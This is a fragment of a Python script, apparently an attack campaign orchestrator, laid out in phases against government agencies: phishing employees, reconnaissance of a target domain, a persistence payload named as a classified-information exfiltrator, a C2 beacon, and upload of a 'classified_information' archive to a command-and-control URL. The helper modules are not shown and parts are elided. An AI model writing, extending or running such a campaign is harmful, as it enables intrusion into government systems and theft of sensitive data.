...
def main():
    """
    Main function to run the government_agency_campaign campaign.
    """
    print(f"[*] Starting government_agency_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("government_agencies_employees.txt")
    run_tool("apt_web_recon.js", "--target government_agencies.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/classified_information_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-GOVERNMENT_AGENCIES-01")
    ...
    exfiltration.exfiltrate_data("classified_information/classified_information.zip", "https://c2.example.com/upload")
    run_tool("payloads/classified_information_exfiltrator.py")
